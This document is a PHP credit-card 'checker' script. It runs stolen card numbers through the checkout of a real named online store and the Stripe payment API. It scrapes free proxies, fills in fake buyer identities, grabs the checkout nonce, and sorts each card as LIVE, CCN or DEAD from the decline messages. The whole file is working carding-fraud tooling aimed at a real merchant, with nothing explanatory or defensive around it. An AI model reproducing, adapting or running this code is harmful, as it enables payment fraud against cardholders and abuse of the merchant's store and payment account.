<?php


error_reporting(1);
set_time_limit(0);
date_default_timezone_set('America/Buenos_Aires');
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-cache");
header("Pragma: no-cache");

#----------------------------------------FUNCTIONS-------------------------------------------------#



if(!is_dir(getcwd()."/rose")) mkdir(getcwd()."/rose", 0755);
$rose = getcwd()."/rose/goldie".rand(1000000, 99999999).".txt";

function string_between_two_string($str, $starting_word, $ending_word){ 
$subtring_start = strpos($str, $starting_word); 
$subtring_start += strlen($starting_word);   
$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
return substr($str, $subtring_start, $size);
};
function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$site = file_get_contents('https://www.sslproxies.org/');
preg_match_all("/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}<\/td><td>[0-9]{1,5}/", $site, $matches);

foreach ($matches[0] as $proxylist) {
  fwrite(fopen('proxy.txt', "a"), str_replace('</td><td>', ':', $proxylist) . "\r\n");
}
extract($_GET); 
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$f1 = substr($cc, 0, 4); 
$f2 = substr($cc, 4, 4); 
$f3 = substr($cc, 8, 4); 
$f4 = substr($cc, -4);
$email = "bert".rand(1, 200000)."@gmail.com";
$name = "bsja".rand(1, 200000);
$last = "nakab".rand(1, 200000);
$street = "nssk".rand(1, 200000);
$city = "jsjn".rand(1, 200000);
$state = "california";
$phone = rand(1, 200000);
$zip = rand (1000, 9999);
If(strlen($ano) > 2)
{
  $ano1 = substr($ano,2,2);
}
If(substr($mes,0,1) == 0)
{
  $mes1 = substr($mes,1,1);
}else {
    $mes1 = $mes;
}

$cbin = substr($cc, 0,1);
if($cbin == "5"){
$cbin = "mastercard";
}else if($cbin == "4"){
$cbin = "visa";
}else if($cbin == "3"){
$cbin = "amex";
}
 $bin = substr($cc,0,6);
 $first4 = substr($cc,0,4);
 $second4 = substr($cc, 4,4);
 $third4 = substr($cc, 8, 4);
 $last4 = substr($cc,12,4);
 $last2 = substr($cc, 14,2);

 $surnames = preg_split('//', 'montecalvo');
shuffle($surnames);
foreach($surnames as $surname) {
  
}
$t=time();
$date = (date("Ymdhs",$t));

$trans = rand(1,21);

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email1 = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$serve_arr = array("gmail.com","hotmail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email1= str_replace("example.com", $serv_rnd, $email1);
$email = ''.rand(0000,1000).''.$email1.'';
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

                    function numGenerate($length = 10) {
                        $characters = '0123456789';
                        $charactersLength = strlen($characters);
                        $randomString = '0';
                        for ($i = 0; $i < $length; $i++) {
                            $randomString .= $characters[rand(0, $charactersLength - 1)];
                        }
                        return $randomString."";
                    }
                    $randnum = numGenerate();
#---------------------------------------END OF FUNCTIONS-------------------------------------------------#



#/////////////////////////////////////// 1ST REQUEST /////////////////////////////////////////////////////#
#-----------------------------------------ADD TO CART-------------------------------------------------#

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, 'https://www.everybodynutrition.com/product/outright-bar/');  
curl_setopt($ch, CURLOPT_HEADER, 0); 
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $rose, CURLOPT_COOKIEJAR => $rose]);
   curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'authority: www.everybodynutrition.com',
   'method: POST',
   'path: /?wc-ajax=add_to_cart',
   'scheme: https',
   'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
   'accept-language: en-US,en;q=0.9',
   'content-type: multipart/form-data; boundary=----WebKitFormBoundarybqV2G7azAQISRFdo',
   'origin: https://www.everybodynutrition.com',
   'referer: https://www.everybodynutrition.com/product/outright-bar/',
   'sec-ch-ua: "Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"',
   'sec-fetch-dest: empty',
   'sec-fetch-mode: cors',
   'sec-fetch-site: same-origin',
   'sec-fetch-user: ?1',
   'upgrade-insecure-requests: 1',
   'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',  
));

#-------------------------------------------POSTFIELDS-------------------------------------------------#
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundarybqV2G7azAQISRFdo
Content-Disposition: form-data; name="attribute_pa_flavor"

cinnamon-sugar-donut-cashew-butter
------WebKitFormBoundarybqV2G7azAQISRFdo
Content-Disposition: form-data; name="quantity"

1
------WebKitFormBoundarybqV2G7azAQISRFdo
Content-Disposition: form-data; name="add-to-cart"

571
------WebKitFormBoundarybqV2G7azAQISRFdo
Content-Disposition: form-data; name="product_id"

571
------WebKitFormBoundarybqV2G7azAQISRFdo
Content-Disposition: form-data; name="variation_id"

9042
------WebKitFormBoundarybqV2G7azAQISRFdo--
'); 
$add = curl_exec($ch); 
curl_close($ch); 
#//////////////////////////////////// END OF 1ST REQUEST /////////////////////////////////////////////////#









#/////////////////////////////////////// 2ND REQUEST /////////////////////////////////////////////////////#
#--------------------------------------------CHECKOUT-----------------------------------------------------#

$ch = curl_init(); 
curl_setopt($ch, CURLOPT_URL, 'https://www.everybodynutrition.com/checkout/'); 
curl_setopt($ch, CURLOPT_HEADER, 0); 
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $rose, CURLOPT_COOKIEJAR => $rose]);
   curl_setopt($ch, CURLOPT_HTTPHEADER, array( 
   'authority: www.everybodynutrition.com', 
   'method: GET', 
   'path: /checkout/', 
   'scheme: https', 
   'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 
   'accept-language: en-US,en;q=0.9', 
   'referer: https://www.everybodynutrition.com/cart/', 
   'sec-ch-ua: "Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"', 
   'sec-fetch-dest: document', 
   'sec-fetch-mode: navigate', 
   'sec-fetch-site: same-origin', 
   'sec-fetch-user: ?1', 
   'upgrade-insecure-requests: 1', 
   'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36', 
)); 
$checkout = curl_exec($ch);
$nonce = GetStr($checkout, 'name="woocommerce-process-checkout-nonce" value="','"');
#-------------------------------------FOR RANDOMIZING NONCE------------------------------------------#
#//////////////////////////////////// END OF 2ND REQUEST /////////////////////////////////////////////////#










#/////////////////////////////////////// 3RD REQUEST /////////////////////////////////////////////////////#
#-------------------------------------------STRIPE KEME-------------------------------------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $rose, CURLOPT_COOKIEJAR => $rose]);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(   
   'authority: api.stripe.com',
   'method: POST', 
   'path: /v1/sources', 
   'scheme: https', 
   'accept: application/json', 
   'accept-language: en-US,en;q=0.9', 
   'content-type: application/x-www-form-urlencoded', 
   'origin: https://js.stripe.com', 
   'referer: https://js.stripe.com/',
   'sec-fetch-dest: empty', 
   'sec-fetch-mode: cors', 
   'sec-fetch-site: same-site', 
   'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36', 
'x-requested-with: XMLHttpRequest', 
)); 
curl_setopt($ch, CURLOPT_POSTFIELDS,'type=card&owner[name]=Jake+Sy&owner[address][line1]=6286&owner[address][state]=CA&owner[address][city]=Burbank&owner[address][postal_code]=94545&owner[address][country]=US&owner[email]=kyutiesoobin%40gmail.com&owner[phone]=7077568098&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mes.'&card[exp_year]='.$ano1.'&guid=f0351a9d-e324-4e7d-904e-ac68f5b459e2f57eb8&muid=68691046-a1b4-4e58-97a7-4065c0fde17d63a9da&sid=33f83d98-6615-4c83-8ea5-6f824f229f6584232e&payment_user_agent=stripe.js%2F0da0418a4%3B+stripe-js-v3%2F0da0418a4&time_on_page=130261&key=pk_live_E9kTzUGJKwC67TUMhVNHeQur');
$api = curl_exec($ch);
$id = trim(strip_tags(getStr($api,'"id": "','"')));
#-------------------------------------FOR RANDOMIZING ID------------------------------------------------#
#//////////////////////////////////// END 3RD REQUEST ///////////////////////////////////////////////////#








#////////////////////////////////////// 4TH REQ ///////////////////////////////////////////////////#
#------------------------------------ WC-AJAX=CHECKOUT -----------------------------------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.everybodynutrition.com/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $rose, CURLOPT_COOKIEJAR => $rose]);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(   
   'authority: www.everybodynutrition.com',
   'method: POST', 
   'path: /?wc-ajax=checkout', 
   'scheme: https', 
   'accept: application/json, text/javascript, */*; q=0.01', 
   'accept-language: en-US,en;q=0.9', 
   'content-type: application/x-www-form-urlencoded; charset=UTF-8', 
   'origin: https://www.everybodynutrition.com', 
   'referer: https://www.everybodynutrition.com/checkout/', 
   'sec-ch-ua: "Chromium";v="94", "Google Chrome";v="94", ";Not A Brand";v="99"', 
   'sec-fetch-dest: empty', 
   'sec-fetch-mode: cors', 
   'sec-fetch-site: same-origin', 
   'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36', 
    'x-requested-with: XMLHttpRequest', 
)); 
curl_setopt($ch, CURLOPT_POSTFIELDS,'billing_first_name=Jake&billing_last_name=Sy&billing_company=&billing_country=US&billing_address_1=6286&billing_address_2=&billing_city=Burbank&billing_state=CA&billing_postcode=94545&billing_phone=7077568098&billing_email=kyutiesoobin'.rand(0000,9999).'%40gmail.com&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=US&shipping_address_1=6286&shipping_address_2=&shipping_city=Burbank&shipping_state=CA&shipping_postcode=94545&shipping_phone=&order_comments=&shipping_method%5B0%5D=usps_first_class&wc_gc_cart_code=&payment_method=stripe&woocommerce-process-checkout-nonce='.$nonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&stripe_source='.$id);
$exe = curl_exec($ch);
#////////////////////////////////////// END 4TH REQ ///////////////////////////////////////////////////#


#------------------------------------ TRIMMING RESPONSE -----------------------------------------------#
$msg = trim(strip_tags(getStr($exe,'{"result":"failure","messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t','\t\t<\/li>\n\t<\/ul>\n","refresh":false,"reload":false}')));
#------------------------------------====================----------------------------------------------#

/*

echo "NONCE: ".$nonce."<hr>";
echo "TOK: ".$id."<hr>";
*/
#UNECHO NALANG PAG AYOS NA#


#------------------------------------ RESPONSES -----------------------------------------------#
if (strpos($exe, "success") !== false)
{
echo '<b style="color:#FFFFFF;">#LIVE » [ '.$lista.' ] </b> <b style="color:#2BD63D;">[ THANK YOU FOR YOUR ORDER  ]</b>   <b style="color:#2BD63D;"></b> </br>';
}
else if(substr_count($exe, 'Your card has insufficient funds.') == 1){
    echo '<b style="color:#FFFFFF;">#LIVE » [ '.$lista.' ] </b> <b style="color:#2BD63D;">[ '.$msg.' ]</b>   <b style="color:#2BD63D;"></b> </br>';
}
else if(substr_count($exe, 'insufficient_funds') == 1){
    echo '<b style="color:#FFFFFF;">#LIVE » [ '.$lista.' ] </b> <b style="color:#2BD63D;">[ '.$msg.' ]</b>   <b style="color:#2BD63D;"></b> </br>';
}
else if(substr_count($exe, "Your card's security code is incorrect.") == 1){
    echo '<b style="color:#FFFFFF;">#CCN » [ '.$lista.' ] </b> <b style="color:#2BD63D;">[ '.$msg.' ]</b>   <b style="color:#2BD63D;"></b> </br>';
}
else {
echo '<b style="color:#db0000;">#DEAD » '.$lista.' » </b> <b style="color:#FFFFFF;"> '.$rcode.' '.$msg.'  </b>  </b><br>';
}

curl_close($ch);
unlink($rose);
ob_flush();
?>